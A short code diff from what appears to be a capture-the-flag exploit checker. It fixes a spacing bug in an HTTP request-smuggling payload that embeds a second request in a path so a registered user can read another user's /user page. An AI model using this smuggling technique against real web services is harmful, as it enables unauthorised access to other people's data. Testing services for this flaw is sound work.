@@ -146,7 +146,7 @@ async def exploit_simple_smugling(task: ExploitCheckerTaskMessage, logger: Logge
     await do_register(task, logger, username, password)
     token = await do_login(task, logger, username, password)
     path = f"/user/{username_to_hack}"
-    true_path = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\nGET" + path
+    true_path = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\nGET " + path
     status, headers, body = await do_request_fakepath(task.address, PORT, "GET", path, true_path, {"x-token":token}, None)
     assert_status_code(logger, path, status, headers, body, code=200)
 
